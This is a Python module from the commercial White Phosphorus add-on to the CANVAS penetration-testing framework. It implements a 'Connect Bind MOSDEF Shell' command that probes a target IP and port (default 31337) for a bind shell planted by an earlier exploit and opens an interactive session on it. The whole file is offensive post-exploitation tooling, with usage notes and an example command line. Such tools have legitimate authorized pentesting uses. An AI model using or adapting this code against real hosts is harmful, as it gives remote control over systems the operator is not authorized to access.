
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys
import os
import socket
import time
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer


######################################################################################
NAME = "Connect Bind MOSDEF Shell"
DESCRIPTION = "A command to connect to Bind MOSDEF Shells"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION["Notes"] = """
Use this command to connect to Bind MOSDEF Shells after delivering the Bind MOSDEF Shell payload in an exploit"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Commands"

NOTES="""
WP> White Phosphorus Exploit Pack
WP> Connect Bind MOSDEF Shell
---------------------------------------------------------------
Usage:
-t <target ip> 
-l <callback ip> 
-O bind:<port>

Notes:
Use this command to connect to Bind MOSDEF Shells after delivering
the Bind MOSDEF Shell payload in a clientside exploit.

Example:
./3rdparty/White_Phosphorus/exploits/wp_connect_bindshell/wp_connect_bindshell.py  -t 10.1.1.10 -l 10.1.1.1 -O bind:31337
"""

PORT = 0
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Universal", (0x00000000), []],
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s############################################################
    PAYLOADS=["Bind MOSDEF Shell"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.shell_BINDSHELL = True
        return

    def usage(self):
        print "%s"%NOTES
        return  
    
    def test(self):
        return

    def getArgs(self):
        self.host=self.target.interface
        if not getattr(self, 'RunFromGUI',False):
            if self.argsDict.has_key("bind"):
                p = int(self.argsDict["bind"])
                self.argsDict["payloadBindPort"] = p
    
        self.bindPort = self.argsDict.get('payloadBindPort',31337)
        return


    def run(self):
        self.getArgs()
        
        self.log("WP> Checking %s:%d for Bind MOSDEF shell"%(self.host,self.bindPort))
        
        ret = self.win32NonCallbackShellcodeCheck()
        if ret:
            self.setInfo("WP> %s completed - (success!)"%NAME)
            return ret
        
        self.setInfo("WP> %s completed - (failed!)"%(NAME))
        return 0

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
